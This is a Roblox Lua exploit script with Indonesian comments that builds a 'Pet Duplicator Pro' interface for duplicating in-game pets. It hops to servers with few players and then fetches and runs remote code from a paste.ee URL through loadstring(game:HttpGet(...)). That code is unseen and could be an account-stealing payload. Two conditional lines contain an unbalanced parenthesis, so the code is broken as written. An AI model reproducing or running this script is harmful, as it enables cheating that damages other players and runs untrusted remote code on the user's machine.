local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- Konfigurasi
local VALID_PETS = {
    ["red fox"] = true,
    ["dragonfly"] = true,
    ["raccoon"] = true,
    ["praying mantis"] = true,
    ["deer"] = true
}
local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
local TARGET_PLAYER_COUNT = 2  -- Jumlah player ideal untuk dupe
local MAX_PLAYER_COUNT = 5     -- Jumlah maksimal player sebelum mencari server lain

-- GUI Utama
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdvancedPetDuplicator"
screenGui.Parent = gui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 180)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Komponen GUI
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "Pet Duplicator Pro"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Text = "Status: Ready"
statusLabel.Size = UDim2.new(0.9, 0, 0, 40)
statusLabel.Position = UDim2.new(0.05, 0, 0, 40)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 14
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = mainFrame

local dupeButton = Instance.new("TextButton")
dupeButton.Name = "DupeButton"
dupeButton.Text = "DUPE PET"
dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
dupeButton.Position = UDim2.new(0.05, 0, 0, 90)
dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
dupeButton.BorderSizePixel = 0
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.GothamBold
dupeButton.TextSize = 14
dupeButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = dupeButton

local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Text = "_"
minimizeButton.Size = UDim2.new(0, 30, 0, 20)
minimizeButton.Position = UDim2.new(1, -35, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
minimizeButton.BorderSizePixel = 0
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Font = Enum.Font.GothamBold
minimizeButton.TextSize = 14
minimizeButton.Parent = mainFrame

local showGuiButton = Instance.new("TextButton")
showGuiButton.Name = "ShowGuiButton"
showGuiButton.Text = "Show Menu"
showGuiButton.Size = UDim2.new(0, 100, 0, 40)
showGuiButton.Position = UDim2.new(0, 10, 0, 10)
showGuiButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
showGuiButton.BorderSizePixel = 0
showGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
showGuiButton.Font = Enum.Font.GothamBold
showGuiButton.TextSize = 14
showGuiButton.Visible = false
showGuiButton.Parent = screenGui

-- Fungsi Utilitas
local function updateStatus(text, color)
    statusLabel.Text = "Status: "..text
    statusLabel.TextColor3 = color or Color3.fromRGB(200, 200, 200)
end

local function findHeldValidPet()
    -- Cek karakter
    local character = player.Character
    if character then
        for _, child in ipairs(character:GetChildren()) do
            if (child:IsA("Tool") and VALID_PETS[child.Name:lower()] then
                return child
            end
        end
    end
    
    -- Cek backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if (child:IsA("Tool") and VALID_PETS[child.Name:lower()] then
                return child
            end
        end
    end
    
    return nil
end

local function executeDupeScript()
    -- Cek pet valid
    if not findHeldValidPet() then
        updateStatus("No valid pet!", Color3.fromRGB(255, 50, 50))
        return
    end

    -- Cek jumlah player di server
    local playerCount = #Players:GetPlayers()
    
    if playerCount >= MAX_PLAYER_COUNT then
        updateStatus("Server too full, finding new...", Color3.fromRGB(255, 165, 0))
        
        -- Cari server baru dengan jumlah player ideal
        local success, result = pcall(function()
            return TeleportService:GetCurrentServerInstanceId()
        end)
        
        if success then
            local currentPlaceId = game.PlaceId
            local currentJobId = result
            local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..currentPlaceId.."/servers/Public?limit=100"))
            
            for _, server in ipairs(servers.data) do
                if server.playing >= 1 and server.playing <= TARGET_PLAYER_COUNT and server.id ~= currentJobId then
                    updateStatus("Teleporting to better server...", Color3.fromRGB(0, 200, 0))
                    TeleportService:TeleportToPlaceInstance(currentPlaceId, server.id, player)
                    return
                end
            end
        end
        
        updateStatus("No good server found", Color3.fromRGB(255, 50, 50))
        return
    elseif playerCount < TARGET_PLAYER_COUNT then
        updateStatus("Waiting for more players...", Color3.fromRGB(255, 165, 0))
        return
    end

    -- Eksekusi script dupe jika kondisi ideal
    updateStatus("Starting dupe process...", Color3.fromRGB(0, 150, 0))
    dupeButton.Text = "DUPING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)

    local success, err = pcall(function()
        loadstring(game:HttpGet(DUPESCRIPT_URL))()
    end)

    if success then
        updateStatus("Dupe successful!", Color3.fromRGB(0, 200, 0))
    else
        updateStatus("Error: "..tostring(err), Color3.fromRGB(255, 50, 50))
    end

    dupeButton.Text = "DUPE PET"
    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
end

-- Fungsi GUI
local function toggleGUI(visible)
    mainFrame.Visible = visible
    showGuiButton.Visible = not visible
end

-- Event Handlers
minimizeButton.MouseButton1Click:Connect(function()
    toggleGUI(false)
end)

showGuiButton.MouseButton1Click:Connect(function()
    toggleGUI(true)
end)

dupeButton.MouseButton1Click:Connect(function()
    executeDupeScript()
end)

-- Auto update status pet
player.CharacterAdded:Connect(function()
    task.wait(1) -- Tunggu karakter selesai load
    if findHeldValidPet() then
        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    else
        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end
end)

-- Inisialisasi
toggleGUI(true)
if findHeldValidPet() then
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
end
